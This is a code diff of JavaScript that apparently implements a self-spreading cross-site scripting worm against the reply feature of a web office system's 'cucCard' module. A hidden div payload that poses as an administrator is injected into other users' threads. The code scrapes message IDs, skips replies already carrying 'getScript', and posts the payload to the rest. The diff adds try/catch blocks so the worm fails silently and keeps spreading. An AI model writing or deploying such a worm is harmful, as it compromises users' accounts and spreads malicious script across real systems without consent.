@@ -3,17 +3,23 @@ evilStr='<div style=display:none >"},{\'optorName\':\'管理员\',\'replyContent
 
 function sendCommentFromPageRegExp(url,regExpStr,msg){
     $.get(url,function(data){
-        var pat=new RegExp(regExpStr,"g");
-        var result;
-        while((result=pat.exec(data))!=null){
-            var  sendurl="/office/cucCard/cucCardAction_queryReplyByPage.so?sendId="+result[1];
-            var evilMsg=msg+evilStr;
-            $.get(sendurl,function(jsonData){
-					if(jsonData.indexOf("getScript")<0){
-				         var id=/sendId":"(\d+)/.exec(jsonData)[1];
-				         $.post("/office/cucCard/cucCardAction_reply.so",{sendId:id,content:evilMsg,ifSendCard:"00"});
-				    }
-            });
+    	try{
+	        var pat=new RegExp(regExpStr,"g");
+	        var result;
+	        while((result=pat.exec(data))!=null){
+	            var  sendurl="/office/cucCard/cucCardAction_queryReplyByPage.so?sendId="+result[1];
+	            var evilMsg=msg+evilStr;
+	            $.get(sendurl,function(jsonData){
+	            	try{
+	                                        if(jsonData.indexOf("getScript")<0){
+	                                         var id=/sendId":"(\d+)/.exec(jsonData)[1];
+	                                         $.post("/office/cucCard/cucCardAction_reply.so",{sendId:id,content:evilMsg,ifSendCard:"00"});
+	                                    }
+	            	}catch(err){
+	            	}
+	            });
+	        }
+    	}catch(err){
         }
     })
 }
